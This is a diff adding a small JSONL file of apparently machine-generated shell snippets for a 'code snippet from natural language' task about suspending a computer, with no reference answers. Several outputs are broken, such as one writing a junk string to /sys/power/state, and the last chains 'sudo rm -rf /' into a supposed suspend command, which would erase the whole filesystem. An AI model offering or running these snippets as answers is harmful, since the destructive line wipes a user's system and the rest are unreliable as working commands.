@@ -1,0 +1,5 @@
+{"output":"suspend","title":"code snippet from natural language","truth":"","version":"0"}
+{"output":"echo mem > /sys/power/state","title":"code snippet from natural language","truth":"","version":"0"}
+{"output":"sudo pm-suspend","title":"code snippet from natural language","truth":"","version":"0"}
+{"output":"echo 'asdfasdfasdfasdfasdf' | sudo tee /sys/power/state  # You can also use: echo mem > /sys/power/state # suspend the memory","title":"code snippet from natural language","truth":"","version":"0"}
+{"output":"macbook-pro-3:~ rst$ sudo pmset standby 0 && sudo rm -rf / && sudo hdparm -S 128 / && sudo echo \"hibernate\" | pmset -a hibernate on && sudo /bin/sleep 1 &&","title":"code snippet from natural language","truth":"","version":"0"}
